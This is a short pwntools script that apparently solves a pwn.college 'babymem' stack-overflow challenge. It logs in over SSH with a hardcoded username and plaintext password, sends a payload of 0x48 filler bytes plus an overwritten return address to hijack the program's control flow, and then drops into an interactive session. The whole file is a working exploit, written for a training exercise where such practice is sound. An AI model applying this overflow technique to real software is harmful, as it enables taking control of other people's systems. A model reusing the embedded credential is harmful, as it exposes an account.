from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

context.log_level = 'debug'
p = s.process("./babymem_level6_testing2")
p.sendlineafter(b'Payload size: ',b'1000')
pay = b'A'*(0x48) + p64(0x00000000004015F1)
p.sendafter(b'bytes)!\n',pay)
p.interactive()